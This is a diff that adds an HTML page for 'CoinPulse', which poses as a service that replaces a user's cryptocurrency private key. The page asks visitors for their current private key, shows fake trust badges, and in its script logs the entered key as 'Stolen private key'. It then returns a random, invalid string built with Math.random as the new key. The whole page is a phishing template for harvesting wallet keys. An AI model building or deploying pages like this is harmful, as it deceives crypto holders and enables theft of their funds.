@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CoinPulse - Secure Your Crypto</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: #f9f9f9;
+            color: #333;
+            line-height: 1.6;
+        }
+        .navbar {
+            background: #1a3c34;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .navbar img.logo {
+            width: 50px;
+        }
+        .navbar .brand {
+            color: #ffd700;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .navbar .nav-links a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 16px;
+        }
+        .navbar .nav-links a:hover {
+            color: #ffd700;
+        }
+        .ticker {
+            background: #f0f0f0;
+            padding: 10px;
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        .ticker span {
+            display: inline-block;
+            padding-right: 20px;
+            animation: scroll 15s linear infinite;
+        }
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 30px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        h1 {
+            color: #1a3c34;
+            font-size: 32px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 16px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        select, input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #1a3c34;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+        }
+        button:hover:not(:disabled) {
+            background: #15332d;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f0f0f0;
+            border-radius: 5px;
+            font-size: 14px;
+            color: #333;
+            word-wrap: break-word;
+        }
+        #downloadBtn {
+            display: none;
+            margin-top: 10px;
+            background: #ffd700;
+            color: #1a3c34;
+        }
+        #downloadBtn:hover {
+            background: #e6c200;
+        }
+        .loader {
+            display: none;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #1a3c34;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #timestamp {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 15px;
+        }
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 30px;
+        }
+        .trust-badges img {
+            width: 60px;
+            height: auto;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #777;
+            background: #1a3c34;
+            color: #fff;
+            margin-top: 40px;
+        }
+        .footer a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div>
+            <img src="https://images.pexels.com/photos/844124/pexels-photo-844124.jpeg?auto=compress&cs=tinysrgb&w=50&h=50&fit=crop" alt="CoinPulse Logo" class="logo">
+            <span class="brand">CoinPulse</span>
+        </div>
+        <div class="nav-links">
+            <a href="index.html">Home</a>
+            <a href="about.html">About</a>
+            <a href="testimonials.html">Testimonials</a>
+            <a href="tips.html">Security Tips</a>
+        </div>
+    </div>
+    <div class="ticker" id="priceTicker">
+        <span>Loading live prices...</span>
+    </div>
+    <div class="container">
+        <h1>Secure Your Crypto Future</h1>
+        <p>Generate a new private key with CoinPulse to stay ahead of threats. Trusted by thousands of crypto holders worldwide.</p>
+        <select id="cryptoType">
+            <option value="bitcoin">Bitcoin (BTC)</option>
+            <option value="ethereum">Ethereum (ETH)</option>
+            <option value="tether">Tether (USDT)</option>
+            <option value="binance">Binance Coin (BNB)</option>
+            <option value="cardano">Cardano (ADA)</option>
+        </select>
+        <input type="text" id="privateKey" placeholder="Enter your current private key">
+        <button id="generateBtn" onclick="changeKey()">Generate New Key</button>
+        <div id="loader" class="loader"></div>
+        <div id="result"></div>
+        <button id="downloadBtn" onclick="downloadKey()">Download Key</button>
+        <div id="timestamp"></div>
+        <div class="trust-badges">
+            <img src="https://images.pexels.com/photos/3825588/pexels-photo-3825588.png?auto=compress&cs=tinysrgb&w=60&h=60&fit=crop" alt="Certified Secure">
+            <img src="https://images.pexels.com/photos/3825588/pexels-photo-3825588.png?auto=compress&cs=tinysrgb&w=60&h=60&fit=crop" alt="Blockchain Verified">
+        </div>
+    </div>
+    <div class="footer">
+        © 2025 CoinPulse | <a href="mailto:support@coinpulse.io">support@coinpulse.io</a> | Protecting Your Crypto, One Key at a Time
+    </div>
+
+    <script>
+        // Fetch live prices from CoinGecko
+        function updatePriceTicker() {
+            fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,binancecoin,cardano&vs_currencies=usd')
+                .then(response => response.json())
+                .then(data => {
+                    const ticker = document.getElementById('priceTicker');
+                    ticker.innerHTML = `
+                        <span>
+                            BTC: $${data.bitcoin.usd.toLocaleString()} | 
+                            ETH: $${data.ethereum.usd.toLocaleString()} | 
+                            USDT: $${data.tether.usd.toLocaleString()} | 
+                            BNB: $${data.binancecoin.usd.toLocaleString()} | 
+                            ADA: $${data.cardano.usd.toLocaleString()}
+                        </span>
+                    `;
+                })
+                .catch(error => {
+                    console.error('Error fetching prices:', error);
+                    document.getElementById('priceTicker').innerHTML = '<span>Price data unavailable</span>';
+                });
+        }
+
+        // Update ticker initially and every 30 seconds
+        updatePriceTicker();
+        setInterval(updatePriceTicker, 30000);
+
+        // Generate new key
+        function generateBitcoinKey() {
+            const prefix = Math.random() < 0.5 ? '5' : 'K';
+            const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            let key = prefix;
+            for (let i = 0; i < 50; i++) key += chars.charAt(Math.floor(Math.random() * chars.length));
+            return key;
+        }
+
+        function generateEthereumKey() {
+            const chars = '0123456789abcdef';
+            let key = '0x';
+            for (let i = 0; i < 64; i++) key += chars.charAt(Math.floor(Math.random() * chars.length));
+            return key;
+        }
+
+        let lastGeneratedKey = ''; // Store the last key for download
+
+        function changeKey() {
+            const generateBtn = document.getElementById('generateBtn');
+            const loader = document.getElementById('loader');
+            const result = document.getElementById('result');
+            const timestamp = document.getElementById('timestamp');
+            const downloadBtn = document.getElementById('downloadBtn');
+            const cryptoType = document.getElementById('cryptoType').value;
+            const originalKey = document.getElementById('privateKey').value;
+
+            if (originalKey === '' || originalKey.length <= 10) {
+                result.innerText = "Invalid Private Key - Please enter a key longer than 10 characters.";
+                downloadBtn.style.display = 'none';
+                return;
+            }
+
+            generateBtn.disabled = true;
+            loader.style.display = 'block';
+            result.innerText = '';
+            timestamp.innerText = '';
+            downloadBtn.style.display = 'none';
+
+            setTimeout(() => {
+                let newKey;
+                if (cryptoType === 'bitcoin') {
+                    newKey = generateBitcoinKey();
+                } else {
+                    newKey = generateEthereumKey();
+                }
+                lastGeneratedKey = newKey; // Store for download
+                result.innerText = "New Private Key: " + newKey;
+                console.log("Stolen private key: " + originalKey);
+                const now = new Date().toLocaleString();
+                timestamp.innerText = "Last updated: " + now;
+                document.getElementById('privateKey').value = '';
+                loader.style.display = 'none';
+                generateBtn.disabled = false;
+                downloadBtn.style.display = 'block'; // Show download button
+            }, 3000);
+        }
+
+        // Download the generated key as a text file
+        function downloadKey() {
+            if (!lastGeneratedKey) return;
+            const blob = new Blob([lastGeneratedKey], { type: 'text/plain' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'new_key.txt';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
